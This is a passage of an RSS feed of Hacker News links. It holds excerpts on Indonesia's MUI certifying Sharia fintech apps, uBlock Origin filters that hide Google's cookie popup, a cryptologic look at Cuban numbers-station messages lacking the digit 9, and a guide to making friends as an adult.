<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma’ruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">“Shariatization” of the economy</a> — i.e., the growth of digital financial services catering to Muslim users — a priority for the country’s development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users — whether peer-to-peer lending apps, mobile money services, or online stock-trading portals — MUI acts as the arbiter of their religious legitimacy. MUI’s National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI’s religious scholars become embedded in the early evolution of a company’s digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-40x85.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-541x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-400x850.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it’s one of the country’s largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek’s digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja’s team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia’s largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses — riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin’s team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java’s Yogyakarta and author of a national bestseller promoting the vice president’s “Shariatization” worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma’ruf Amin Way</em></a><em>. </em>“They are all Sharia experts,” said Djaenudin. “They gave us guidance and consultations about the product.” </p>



<p>Starting in November 2019, shortly after the vice president’s Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI’s supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI’s rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. “O you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,” reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: “Do not sell gold for gold, and do not sell silver for silver, except in case of like for like.”</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties — users, banking institutions, or the app itself — must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-40x23.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-400x232.png 400w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-600x348.png 600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1000x580.png 1000w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1600x928.png 1600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-2800x1623.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>The supervisory board had other suggestions for LinkAja’s parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one’s total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja’s operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. “From the customer’s perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,” said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. “It’s been almost nine years, and I’m learning all of this from the day I started my business,” he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. “Some customers, they ask, ‘Are you certified, or are you just Sharia?’”&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-40x86.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-538x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-400x857.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps — waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/now-serving-halal-apps/">https://restofworld.org/2020/now-serving-halal-apps/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/now-serving-halal-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516141</guid>
            <pubDate>Fri, 18 Sep 2020 12:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting rid of the Google cookie consent popup]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 65 (<a href="https://news.ycombinator.com/item?id=24515998">thread link</a>) | @edward
<br/>
September 18, 2020 | https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_164">
        <header>
            <h2><a href="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">Getting rid of the Google cookie consent popup</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/18-Internet"><img title="Internet: Remember ... all I'm offering is the truth. Nothing more. (Morpheus to Neo who is choosing the red pill)" alt="Internet" src="https://daniel-lange.com/uploads/http.serendipityThumb.jpg"></a></p><p>If you clear your browser cookies regularly (as you should do), Google will annoy you with a full screen cookie consent overlay these days. And - of course - there is no "no tracking consent, technically required cookies only" button. You may log in to Google to set your preference. Yeah, I'm sure this is totally following the intent of the <a href="https://eur-lex.europa.eu/eli/dir/2009/136/2009-12-19">EU Directive 2009/136/EC</a> (the "cookie law").</p>

<p><!-- s9ymdb:664 --><img width="1332" height="1066" src="https://daniel-lange.com/uploads/entries/200918_Google_cookie_consent_screen.png" alt="Google cookie consent pop-up"></p>

<p>Unfortunately none of the big "anti-annoyances" filter lists seem to have picked that one up yet but the friendly folks from the <a href="https://www.computerbase.de/forum/threads/google-nervt-bevor-sie-fortfahren.1968809/">Computerbase Forum</a> [German] to the rescue. User "Sepp Depp" has created the following filter set that <abbr title="Works For Me">WFM</abbr>:</p>

<p>Add this to your <a href="https://github.com/gorhill/uBlock">uBlock Origin</a> "My filters" tab:</p>

<pre>! Google - remove cookie-consent-popup and restore scoll functionality
google.*##.wwYr3.aID8W.bErdLd
google.*##.aID8W.m114nf.t7xA6
google.*##div[jsname][jsaction^="dg_close"]
google.*##html:style(overflow: visible !important;)
google.*##.widget-consent-fullscreen.widget-consent
</pre>

                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_164.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=164"
                 dc:title="Getting rid of the Google cookie consent popup"
                 dc:identifier="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515998</guid>
            <pubDate>Fri, 18 Sep 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did a broken random number generator in Cuba help expose a Russian spy network?]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24515717">thread link</a>) | @privong
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515717</guid>
            <pubDate>Fri, 18 Sep 2020 12:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make Friends as an Adult]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24515221">thread link</a>) | @Parth86
<br/>
September 18, 2020 | https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that itâ€™s voluntary. Weâ€™re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adultsâ€™ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that arenâ€™t quite as voluntary. The title of the Oxford paper summed up things well: â€˜Romance and Reproduction Are Socially Costlyâ€™.</p>
<p>Such is the pace and busyness of many peopleâ€™s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. Whatâ€™s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants whoâ€™d taken part in studies between 2000 and 2005.</p>
<p>If weâ€™re not careful, we risk living out our adulthoods friendless. This is a situation thatâ€™s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, weâ€™re also at greater risk of feeling more depressed. Itâ€™s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> â€˜Very Happy Peopleâ€™ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Hereâ€™s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. Itâ€™s an exciting challenge in theory, but one of the first obstacles youâ€™ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise â€˜overt avoidanceâ€™, by not putting yourself in situations where itâ€™s possible to meet new people. Instead of going to your friendâ€™s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in â€˜covert avoidanceâ€™, which means that you show up but donâ€™t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after itâ€™s over, you stay silent in the corner, petting someoneâ€™s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality â€“ an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true â€“ they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then itâ€™s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you donâ€™t believe itâ€™s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations â€“ in the lab, in a college dorm, at a professional development workshop â€“ the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled â€˜the liking gapâ€™.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: â€˜Who wants to go eat French fries and talk about life with me?â€™ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didnâ€™t just want to eat snacks and talk about life. I was craving a different kind of life â€“ one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort â€“ for example, by showing up at church or at community groups â€“ and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But itâ€™s not just showing up that matters, itâ€™s saying â€˜helloâ€™ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings â€“ such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically â€˜initiation skillâ€™ that was most important. Once friendships were more stable, it didnâ€™t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: â€˜Commuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.â€™</p>
<p><strong>Keep showing up</strong></p>
<p>Once youâ€™ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, itâ€™s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an …</p></div></div></section></div></div>
